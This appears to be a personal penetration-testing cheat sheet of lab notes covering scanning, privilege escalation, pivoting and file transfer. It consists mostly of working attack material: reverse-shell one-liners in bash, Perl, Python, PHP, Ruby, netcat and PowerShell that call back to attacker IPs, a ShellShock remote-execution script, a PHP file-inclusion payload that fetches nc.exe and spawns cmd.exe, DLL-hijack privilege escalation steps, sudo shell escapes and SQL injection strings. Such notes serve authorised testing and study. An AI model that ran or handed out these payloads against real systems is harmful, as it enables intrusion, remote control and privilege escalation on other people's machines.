<span id="anchor"></span>Pentesting Notes

<span id="anchor-1"></span>Enumeration

<span id="anchor-2"></span>Banner Grabs

<span id="anchor-3"></span>Using telnet

```
telnet **&lt;target IP/FQDN&gt; &lt;target port&gt;**
```

<span id="anchor-4"></span>Using nc

```
nc -v **&lt;target IP/FQDN&gt; &lt;target port&gt;**
```

<span id="anchor-5"></span>HTTP Style Enumeration

<span id="anchor-6"></span>Get Server Options (telnet, nc)

```
telnet <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong>
Escape character is '^]'.
OPTIONS * HTTP/1.1
Host: <strong>&lt;target IP/FQDN&gt;</strong>
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
```

<span id="anchor-7"></span>Get Headers (telnet, nc)

```
telnet <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong>
Escape character is '^]'.
HEAD / HTTP/1.1
Host: <strong>&lt;target IP/FQDN&gt;</strong>
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
```

<span id="anchor-8"></span>Get Full Page Content (telnet, nc)

```
nc -v <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong>
Escape character is '^]'.
GET / HTTP/1.1
Host: <strong>&lt;target IP/FQDN&gt;</strong>
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
```

<span id="anchor-9"></span>

<span id="anchor-10"></span>Use Curl to Get HTTP OPTIONS Response

```
curl -I -X OPTIONS **&lt;target IP/FQDN&gt;**
```

<span id="anchor-11"></span>Use Curl to Get HTTP HEAD Response

```
curl -I -X HEAD **&lt;target IP/FQDN&gt;**
```

<span id="anchor-12"></span>Use Invoke-WebRequest to Get HTTP OPTIONS
Response

```
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, Ssl3"
$(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method OPTIONS).RawContent</p></td>
```

<span id="anchor-13"></span>Use Invoke-WebRequest to Get HTTP HEAD
Response

```
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, Ssl3"
$(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method HEAD).RawContent</p></td>
```

<span id="anchor-14"></span>Privilege Escalation

Some basic notes/thoughts on gaining privilege escalation:

-   Path order exploitation

    -   Look for paths that exist in the path statement that may be
        > searched prior to the desired path location.

-   Unquoted Paths

    -   Look for unquoted paths in services and scheduled tasks. It may
        > be possible to create a path that will execute instead of the
        > intended path.

-   Path Permissions

    -   Look for paths that have permissions that you can write in

-   Missing DLL dependencies

    -   Locate services or other programs that attempt to load missing
        > DLLs or this could be combined with a path order error.

<span id="anchor-15"></span>IKEEXT Service Missing DLL Privileged
Execution

1.  Look for a path that in the %PATH% variable that your user is able
    to write to.
2.  Create a msfvenom payload using the DLL format option.
3.  Place the DLL into the path you located and rename it to:

    -   **Wlbsctrl.dll**

4.  Wait for a restart or trigger a restart of the IKEET service
    somehow.

<span id="anchor-16"></span>Scanning

<span id="anchor-17"></span>NMap

<span id="anchor-18"></span>Host Scan

Scans systems and reports a list of hosts that it finds up.

```
nmap -sP 172.28.128.0/24
```

<span id="anchor-19"></span>Basic TCP Scan

Scan ports 1 through 65535 with timing set to 5, OS detection On,
Verbos, and TCP connect.

```
nmap -p 1-65535 -T5 -A -v -sT 192.168.57.101
```

<span id="anchor-20"></span>Less Noisy SYN Scan

Scan ports 1 through 1024 with timing set to 0, OS detection On, Verbos,
and SYN Only.

```
nmap -p 1-1024 -T0 -A -v -sS 192.168.57.101
```

<span id="anchor-21"></span>Scan a Service for Vulnerabilities Using NSE

Scan the hosts contained in the file for vulnerabilities that match the
given ls filter.

```
for vuln in $(ls /usr/share/nmap/scripts/**&lt;filename mask&gt;**\*); do nmap -p 80 --open -iL **&lt;hostfile&gt;** --script $vuln &gt;&gt; **&lt;outputfile&gt;**; done
```

<span id="anchor-22"></span>Quick ‘n Dirty Bash Ping Sweep

Scan the entire 10.11.1/24 network

```
#!/bin/bash

for ((ip = 0; ip &lt;= 254; ip++));
      do ping -c 1 10.11.1.$ip | grep "bytes from" | awk -F " " '{print $4}' | cut -d ":" -f 1 2&gt;&amp;1 &amp;
      sleep .25
done</td>
```

<span id="anchor-23"></span>Python Ping Sweep with Multi-Threading
(Linux)

Scan the entire 10.11.1/24 network

```
#!/usr/bin/python

import multiprocessing
import subprocess
import shlex

from multiprocessing.pool import ThreadPool

def call_proc(ip):
      command = "ping -c1 " + ip + " | grep 'bytes from' | awk -F ' ' '{print $4}' | cut -d ':' -f 1"
      p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)
      while True:
              out = p.stderr.read(1)
              if out == '' and p.poll() != None:
                      break
              if out != '':
                      sys.stdout.write(out)
                      sys.stdout.flush()

ips = []
pool = ThreadPool(10)

for i in range(1,255):
      ips.append("10.11.1." + str(i))

print(ips)

pool.map(call_proc, ips)

pool.close()
pool.join()</td>
```

<span id="anchor-24"></span>Python Ping Sweep with Multi-Threading
(Windows)

```
import multiprocessing
import subprocess
import shlex
import sys
from multiprocessing.pool import ThreadPool
def call_proc(ip):
        command = 'ping -n 1 {ip} | findstr "Reply from"'.format(ip = ip)
        p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)
        while True:
                out = p.stderr.read(1)
                if out == '' and p.poll() != None:
                        break
                if out != '':
                        sys.stdout.write(out)
                        sys.stdout.flush()
ips = []
pool = ThreadPool(10)
for i in range(1,255):
        ips.append("10.1.1." + str(i))
print(ips)
pool.map(call_proc, ips)
pool.close()
pool.join()</p></td>
```

<span id="anchor-25"></span>Python Port Scan

```
#!/usr/bin/env python
import socket
import subprocess
import sys
from datetime import datetime

# Clear the screen
subprocess.call('clear', shell=True)

# Ask for input
remoteServer   = raw_input("Enter a remote host to scan: ")
remoteServerIP = socket.gethostbyname(remoteServer)

# Print a nice banner with information on which host we are about to scan
print "-" * 60
print "Please wait, scanning remote host", remoteServerIP
print "-" * 60

# Check what time the scan started
t1 = datetime.now()

# Using the range function to specify ports (here it will scans all ports between 1 and 1024)

# We also put in some error handling for catching errors

try:
  for port in range(1,1025):
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      result = sock.connect_ex((remoteServerIP, port))
      if result == 0:
          print "Port {port}: Open".format(port = port)
      sock.close()

except KeyboardInterrupt:
  print "You pressed Ctrl+C"
  sys.exit()

except socket.gaierror:
  print 'Hostname could not be resolved. Exiting'
  sys.exit()

except socket.error:
  print "Couldn't connect to server"
  sys.exit()

# Checking the time again
t2 = datetime.now()

# Calculates the difference of time, to see how long it took to run the script
total = t2 - t1

# Printing the information to screen
print 'Scanning Completed in: ', total</td>
```

<span id="anchor-26"></span>Python Port Scanner (Multi-Threaded)

```
#!/usr/bin/env python
import socket
import subprocess
import sys
import multiprocessing
import subprocess
import shlex
from datetime import datetime
from multiprocessing.pool import ThreadPool
# Clear the screen
subprocess.call('clear', shell=True)
# Ask for input
remoteServer   = raw_input("Enter a remote host to scan: ")
remoteServerIP = socket.gethostbyname(remoteServer)
# Print a nice banner with information on which host we are about to scan
print "-" * 60
print "Please wait, scanning remote host", remoteServerIP
print "-" * 60
# Check what time the scan started
t1 = datetime.now()
# Using the range function to specify ports (here it will scans all ports between 1 and 1024)
# We also put in some error handling for catching errors
def scan_port(port):
try: 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
<blockquote>
sock.settimeout(1)
</blockquote>
result = sock.connect_ex((remoteServerIP, port))
if result == 0:
print "Port {port}: Open".format(port = port)
sock.close()
except KeyboardInterrupt:
print "You pressed Ctrl+C"
sys.exit()
except socket.gaierror:
print 'Hostname could not be resolved. Exiting'
sys.exit()
except socket.error:
print "Couldn't connect to server"
sys.exit()
ports = []
pool = ThreadPool(10)
for port in range(1,1025):
ports.append(port)
pool.map(scan_port, ports)
pool.close()
pool.join()
# Checking the time again
t2 = datetime.now()
# Calculates the difference of time, to see how long it took to run the script
total = t2 - t1
# Printing the information to screen
print 'Scanning Completed in: ', total</p></td>
```

<span id="anchor-27"></span>PowerShell Port Scan

```
1..1024 \| % { echo ((New-Object Net.Sockets.TcpClient).Connect("**&lt;ip address&gt;**", $\_)) "$\_ is open" } 2&gt;Out-Null
```

<span id="anchor-28"></span>GoBuster (Web Common Folder Scan)

```
gobuster -u **&lt;url&gt;** -w /usr/share/seclists/Discovery/Web\_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

<span id="anchor-29"></span>GoBuster (Web Common CGI Scan)

```
gobuster -u **&lt;url&gt;** -w /usr/share/seclists/Discovery/Web\_Content/cgis.txt -s '200,204,301,302,307,403,500' -e
```

<span id="anchor-30"></span>Pivoting

<span id="anchor-31"></span>SSH Reverse Proxy

```
From remote system (behind firewall):
ssh -R 8888:localhost:22 <strong>&lt;local_user&gt;</strong>@<strong>&lt;local_machine&gt;</strong>
From local system:
ssh -D 8181 <strong>&lt;remote_user&gt;</strong>@localhost -p 8888</p></td>
```

<span id="anchor-32"></span>Ncat Fu

<span id="anchor-33"></span>Send Connection/Banner Grab

Grab the banner from the specified SMTP server

```
ncat -nv &lt;ip address&gt; &lt;port&gt;
```

<span id="anchor-34"></span>Files

<span id="anchor-35"></span>Locating Files

<span id="anchor-36"></span>Locate files with setuid bits (\*nix)

```
find / -perm 4000 -o perm 2000 -exec ls -ldb {} \\;
```

<span id="anchor-37"></span>Locate files belonging to a user (\*nix)

<span id="anchor-38"></span>Version 1

```
find -u &lt;username&gt; 2&gt; /dev/null
```

<span id="anchor-39"></span>Version 2

```
find -user &lt;username&gt; 2&gt; /dev/null
```

<span id="anchor-40"></span>Locate files belonging to a group (\*nix)

<span id="anchor-41"></span>Version 1

```
find -g &lt;groupname&gt; 2&gt; /dev/null
```

<span id="anchor-42"></span>Version 2

```
find -group &lt;groupname&gt; 2&gt; /dev/null
```

<span id="anchor-43"></span>Locate files that are world writable (\*nix)

```
find / -perm -2 ! -type l -ls -xdev 2&gt;/dev/null
```

<span id="anchor-44"></span>Locate Files with Weak Permissions (Windows)

See [*accesschk.exe*](#_z7kt47j1y476) section

<span id="anchor-45"></span>Locate Credential Files (Windows)

```
dir /S **\[\*pass\*\|\*cred\*\|\*vnc\*\|\*.config\*\]**
```

<span id="anchor-46"></span>Locate Files Containing &lt;String&gt;

```
findstr /SI **&lt;string&gt;** **\[\*.xml\|\*.ini\|\*.txt\]**
```

<span id="anchor-47"></span>Locate Files & Folders Accessible to Root
Only

```
find **&lt;path&gt;** -user root -perm +400 ! -perm +044 -print
```

<span id="anchor-48"></span>Transfer Files

<span id="anchor-49"></span>Transfer Files Using NetCat (nc)

<span id="anchor-50"></span>Receiving

```
nc -l -p **&lt;port&gt;** &gt; **&lt;filename&gt;**
```

<span id="anchor-51"></span>Sending

```
nc **&lt;address&gt;** **&lt;port&gt;** &lt; **&lt;filename&gt;**
```

<span id="anchor-52"></span>TFTP (from reverse Windows shell)

```
tftp **&lt;ipaddress&gt;** GET **&lt;filename&gt;**
```

<span id="anchor-53"></span>FTP (from reverse Windows shell)

```
echo open <strong>&lt;ipaddress&gt;</strong> 21&gt; ftp.txt
echo USER offsec&gt;&gt; ftp.txt
echo <strong>&lt;password&gt;</strong>&gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET <strong>&lt;filename&gt;</strong> &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt

ftp –v -n -s:ftp.txt</p></td>
```

<span id="anchor-54"></span>VBScript (from reverse Windows shell)

Usage: cscript http://**&lt;ipaddress&gt;**/**&lt;file&gt;**
**&lt;localfilename&gt;**

```
echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs
echo http.Open "GET", strURL, False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
echo strData = "" &gt;&gt; wget.vbs
echo strBuffer = "" &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs</td>
```

<span id="anchor-55"></span>Invoke-WebRequest (from reverse Windows
shell)

Requires PowerShell v3.0 or higher. Relies on IE. May not work on
Windows Server.

```
PS C:\\&gt; Invoke-WebRequest -Uri **&lt;URI&gt;** -OutFile **&lt;dest\_filename&gt;** -UserAgent **&lt;useragentstring&gt;**
```

<span id="anchor-56"></span>PowerShell System.Net.WebClient (from
reverse Windows shell)

**NOTE:** Use only valid URLs and File Names or you will hang the shell.
Can be re-used by specifying -url and -file arguments.

```
echo param ( [string]$url = "<strong>&lt;URI&gt;</strong>", [string]$file = "<strong>&lt;filename&gt;</strong>" ) &gt; wget.ps1
echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</td>
```

<span id="anchor-57"></span>PowerShell BITS Transfer (from reverse
Windows shell)

**NOTE:** Use only valid URLs and File Names or you will hang the shell.

**NOTE:** BITS service must be running.

Can be re-used by specifying -url and -file arguments.

```
echo param ( [string]$url = "<strong>&lt;URI&gt;</strong>", [string]$file = "<strong>&lt;filename&gt;</strong>" ) &gt; bitsget.ps1
echo Import-Module BitsTransfer &gt;&gt; bitsget.ps1
echo Start-BitsTransfer -Source $url -Destination $file &gt;&gt; bitsget.ps1</p></td>
```

<span id="anchor-58"></span>Python Download Echo Script (Windows)

```
echo import urllib &gt; download.py
echo testfile = urllib.URLopener() &gt;&gt; download.py
echo testfile.retrieve('<strong>&lt;url_with_file&gt;</strong>', '<strong>&lt;file_name_to_save&gt;</strong>') &gt;&gt; download.py</td>
```

<span id="anchor-59"></span>Debug (from reverse Windows shell)

This method has size limitations. It will only work with 64k or smaller
files.

```
# First use upx to pack the file to make it smaller
upx -9 &lt;originalPE&gt;
# Use exe2bat.exe to convert the file to a BAT file format
wine exe2bat.exe <strong>&lt;originalPE&gt;</strong> <strong>&lt;destination&gt;</strong>
# Copy and paste the contents of the destination file to your reverse shell</p></td>
```

<span id="anchor-60"></span>Copy Command (Share Access)

```
copy \\\\**&lt;source&gt;** **&lt;destination&gt;**
```

<span id="anchor-61"></span>Echo Command (Share Access)

```
echo “**&lt;base64 encoded data&gt;**” &gt;&gt; **&lt;destination&gt;**
```

**Note**: By base64 encoding the file you will turn it into plain text
that can be echoed to the remote system. It can then be decoded using
the **certutil.exe** command.

<span id="anchor-62"></span>PHP Remote Include FTP Download Script

```
&lt;?php
     // set up basic connection
   $conn_id = ftp_connect("<strong>&lt;ftp_server_address&gt;</strong>");
   // login with username and password
   $login_result = ftp_login($conn_id, "anonymous", "foo@bar.com");
   // check connection
     if ((!$conn_id) || (!$login_result)) {
        echo "Ftp connection has failed!";
        echo "Attempted to connect to $ftp_server for user $user";
        die;
   } else { 
          echo "Connected";
   }
   // upload the file
   $upload = ftp_get($conn_id, "<strong>&lt;writable_path&gt;</strong>, "nc", FTP_BINARY);
  echo $upload;
  // close the FTP stream
  ftp_quit($conn_id);
?&gt;</p></td>
```

<span id="anchor-63"></span>Tunneling

<span id="anchor-64"></span>SSH Tunnels

<span id="anchor-65"></span>SSH Remote Port Forwarding

```
ssh **&lt;gateway&gt;** -R **&lt;remote port to bind&gt;**:**&lt;local host&gt;**:**&lt;local port&gt;**
```

-   **&lt;gateway&gt;** = The Hostname/IP of the machine you are working
    from.
-   **&lt;localhost&gt;** = The local IP of the machine that you have a
    shell open on. I.e. 127.0.0.1
-   **&lt;remote port to bind&gt;** = The local port of the machine that
    you have a shell open on. This is the port that you will connect to.
-   **&lt;local port&gt;** = The port that the service you want to
    connect to is running.

**EXAMPLE: **ssh 10.0.0.20 -R 3390:127.0.0.1:3389

In the above example, this command is being run from the compromised
system. You are connecting back to your working machine. 127.0.0.1:3390
on your working machine is now connected to port 3389 on the compromised
system.

<span id="anchor-66"></span>SSH Local Port Forwarding

```
ssh **&lt;gateway&gt;** -L **&lt;local port to listen&gt;**:**&lt;remote host&gt;**:**&lt;remote port&gt;**
```

-   **&lt;gateway&gt;** = The Hostname/IP of the machine you are working
    from.
-   **&lt;remote host&gt;** = The IP address of the server you would
    like to redirect traffic to.
-   **&lt;local port to listen&gt;** = The local port of the machine
    that you have a shell open on.
-   **&lt;remote port&gt;** = The port on the remote server that you
    would like to redirect traffic to.

**EXAMPLE:** ssh 10.0.0.20 -L 8080:11.11.11.11:80

In the above example, this command is being run from the compromised
system. You are attempting to forward traffic on the compromised system
from 127.0.0.1:8080 to the remote web server hosted on 11.11.11.11:80.

<span id="anchor-67"></span>Reverse Shells

[*http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

<span id="anchor-68"></span>One-Liners

Try substituting “cmd.exe” instead of “/bin/sh” or “/bin/bash” to make
these work in Windows.

Try the following command separators: ;, &&, \|, \|\|

<span id="anchor-69"></span>Bash v1

```
bash -i &gt;& /dev/tcp/10.0.0.1/8080 0&gt;&1
```

<span id="anchor-70"></span>Bash v1.5

```
bash -c 'bash -i &gt;& /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&1'
```

<span id="anchor-71"></span>Bash v2

```
bash -c 'exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done'
```

<span id="anchor-72"></span>Bash v3

```
bash -c 'exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done'
```

<span id="anchor-73"></span>URL Encoded

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F**&lt;address&gt;**%2F**&lt;port&gt;**%200%3E%261%27
```

<span id="anchor-74"></span>Perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,"&gt;&S");open(STDOUT,"&gt;&S");open(STDERR,"&gt;&S");exec("/bin/sh -i");};'
```

<span id="anchor-75"></span>PowerShell

```
$client = New-Object System.Net.Sockets.TCPClient('**&lt;IP\_Address&gt;**',**&lt;port&gt;**);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

<span id="anchor-76"></span>Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```

<span id="anchor-77"></span>PHP

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
```

<span id="anchor-78"></span>Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d",f,f,f)'
```

<span id="anchor-79"></span>Netcat

<span id="anchor-80"></span>Version 1

```
nc -e /bin/sh 10.0.0.1 1234
```

<span id="anchor-81"></span>Version 2

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.0.0.1 1234 &gt;/tmp/f
```

<span id="anchor-82"></span>Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</td>
```

<span id="anchor-83"></span>ShellShock Reverse Shells

<span id="anchor-84"></span>Curl - One-Liner

```
curl -A "() { :;}; echo 'Content-type: text/html'; echo; /bin/ls -al /home/bynarr;" http://192.168.56.101:591/cgi-bin/cat
```

<span id="anchor-85"></span>Python Reverse Shell - ShellShock w/Sudo

```
import requests,sys
from base64 import b64encode
while True:
    user_command = b64encode(raw_input('$ ').strip())
    payload = b64encode("python -c 'import pty,subprocess,os,time;from base64 import b64decode;(master,slave)=pty.openpty();p=subprocess.Popen([\"/bin/su\",\"-c\",b64decode(\"%s\"),\"bynarr\"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"fruity\\n\");time.sleep(0.1);print os.read(master,1024);'"%user_command)
    headers = {
   'User-Agent': '() { :; }; echo \'Content-type: text/html\'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo \'%s\' | base64 -d | bash 2&gt;&amp;1' % payload
    }
    print requests.get('http://192.168.56.101:591/cgi-bin/cat', headers=headers).text.strip()</p></td>
```

<span id="anchor-86"></span>Python Reverse Shells

<span id="anchor-87"></span>Straight Python Shell

```
import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect(('<strong>&lt;LHOST&gt;</strong>',<strong>&lt;LPORT&gt;</strong>))
Hc=False
while not Hc:
data=so.recv(1024)
if len(data)==0:
Hc=True
stdin,stdout,stderr,=os.popen3(data)
stdout_value=stdout.read()+stderr.read()
so.send(stdout_value)</td>
```

<span id="anchor-88"></span>Encode a Python Script (Base64)

```
import base64

with open('<strong>&lt;script_file&gt;</strong>', 'rb') as f:
  encoded = base64.b64encode(f.read())
  print encoded</td>
```

<span id="anchor-89"></span>Decode an Encoded Python Script (Base64)

```
import base64; 
with open('decoded_script.py', 'w') as f:
    decoded = ‘<strong>&lt;base64_string&gt;</strong>'.decode('base64')
    f.write(decoded)
    f.close()</p></td>
```

<span id="anchor-90"></span>Fix TTY Issues In Reverse Shells

<span id="anchor-91"></span>Python PTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
Then fix the term type:
set TERM=linux
Or
export TERM=linux
clear</p></td>
```

<span id="anchor-92"></span>Python Sudo w/o TTY

```
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(\["/bin/su","-c","id","bynarr"\],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\\n");time.sleep(0.1);print os.read(master,1024);'
```

<span id="anchor-93"></span>RDP Via Plink Tunnel
([*https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html*](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))

From Remote/Compromised Host

```
plink.exe &lt;user&gt;@&lt;ip or domain&gt; -pw &lt;password&gt; -P 22 -2 -4 -T -N -C -R 0.0.0.0:12345:127.0.0.1:3389
```

<span id="anchor-94"></span>Shell Escapes (Linux w/sudo)

<span id="anchor-95"></span>vi(m)

```
:!sh
```

```
:set shell=/bin/bash:shell
```

<span id="anchor-96"></span>nmap --interactive

```
!sh
```

<span id="anchor-97"></span>awk

```
awk 'BEGIN {system(\\"/bin/bash\\")}'
```

<span id="anchor-98"></span>perl

```
perl -e 'exec \\"/bin/bash\\";'
```

<span id="anchor-99"></span>find

```
find / -exec /usr/bin/awk 'BEGIN {system(\\"/bin/bash\\")}' \\\\;
```

<span id="anchor-100"></span>X Server Hacks

<span id="anchor-101"></span>How to Run An Application As An
Unprivileged User (i.e. WireShark)

This script will allow you to run an application as an unprivileged user

```
#!/bin/bash
# Add the user to the X windows privilege list
xhost +SI:localuser:<strong>&lt;username&gt;</strong>
# Run the desired X app as the specified user
sudo -u<strong> &lt;username&gt; &lt;command and args&gt;</strong></p></td>
```

<span id="anchor-102"></span>Kali Hacks

<span id="anchor-103"></span>Configure Wireshark to Run As a
Non-Privileged User

These steps will create a group called wireshark that will be granted
permission to run WireShark. You will need to add a standard user to the
system and make them a member of the group.

```
<strong>root@kali:~#</strong> groupadd wireshark
<strong>root@kali:~#</strong> chgrp wireshark /usr/bin/dumpcap
<strong>root@kali:~#</strong> chmod 750 /usr/bin/dumpcap
<strong>root@kali:~#</strong> setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</p></td>
```

<span id="anchor-104"></span>Configure Pure-FTP to Serve Files

This script will create a user and group for pure-ftp as well restart
the service.

```
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart</p></td>
```

<span id="anchor-105"></span>Useful Scripts

<span id="anchor-106"></span>Pull the Google Hacking Database (GHDB)
Into a CSV File

This will pull the GHDB down into a CSV file. You will need to replace
any “&quote;” and “&amp;” with regular characters. Perhaps I’ll add that
after I know all the special characters that they use. This script uses
a Chrome User Agent and pauses for a random interval to try to look less
scripted.

```
#!/bin/bash
for ((i = 2; i&lt;=4299; i++)); do
       page="$(wget --header="accept-encoding: gzip" --user-agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" https://www.exploit-db.com/ghdb/$i/ -O - | gunzip)"
       desc="$(echo $page | grep "Google dork Description:" | awk -F '&lt;/strong&gt;' '{print $2}' | awk -F "&lt;/td&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
       srch="$(echo $page | grep "Google search:" | awk -F 'rel="nofollow"&gt;' '{print $2}' | awk -F "&lt;/a&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
       subm="$(echo $page | grep "Submited:&lt;/strong&gt;" | awk -F '&lt;/strong&gt;' '{print $4}' | awk -F "&lt;/td&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
       echo "\"$desc\", \"$srch\", \"$subm\"" &gt;&gt; ghdb.csv
       sleep "$(rand -M 30)"
done</p></td>
```

<span id="anchor-107"></span>Zone Transfer (Bash)

This script will locate the NS servers and attempt to use the “host”
command to perform a zone transfer.

```
#!/bin/bash
if [ -z "$1" ]; then
echo "You must enter an argument"
else
for nameserver in $(dig -t NS +noall +answer "$1" | grep "NS" | cut -f 5 | sed -e 's/\.*$//'); do
host -l $1 $nameserver | grep "has address" | cut -d " " -f 1,4
done
fi</p></td>
```

<span id="anchor-108"></span>PHP RFI Reverse Shell

This can be used in a RFI/LFI to download nc.exe from the specified
server then run it.

```
&lt;?php
        file_put_contents("nc.exe", fopen("http://<strong>&lt;server&gt;</strong>/nc.exe", 'r'));
        shell_exec("nc.exe -nv <strong>&lt;server&gt;</strong> <strong>&lt;port&gt;</strong> -e cmd.exe");
?&gt;</p></td>
```

Using exec() to change directories and run a file uploaded elsewhere.

```
&lt;?php exec('cd uploads && nc.exe -nv **&lt;server&gt; &lt;port&gt;** -e cmd.exe');?&gt;
```

<span id="anchor-109"></span>Type Juggling

<span id="anchor-110"></span>PHP Loose Comparison

-   [*https://www.php.net/manual/en/types.comparisons.php*](https://www.php.net/manual/en/types.comparisons.php)

<span id="anchor-111"></span>PHP String Conversions

PHP duplicated the string conversion method used by Unix's strtod
command. Using this type of string conversion with Loose comparisons
could lead to type juggling.

-   [*https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion*](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)
-   [*http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html*](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)

<span id="anchor-112"></span>SQL Injection

<span id="anchor-113"></span>SQL Tests

|            |            |             |             |             |              |
|------------|------------|-------------|-------------|-------------|--------------|
| or 1=1     | 'or 1=1    | "or 1=1     | or 1=1-     | 'or 1=1-    | "or 1=1-     |
| or 1=1\#   | 'or 1=1\#  | "or         | 1=1\#       | or 1=1/\*   | 'or 1=1/\*   |
| "or 1=1/\* | or 1=1;%00 | 'or 1=1;%00 | "or 1=1;%00 | 'or'        | 'or          |
| 'or'-      | 'or-       | or a=a      | 'or a=a     | "or a=a     | or a=a-      |
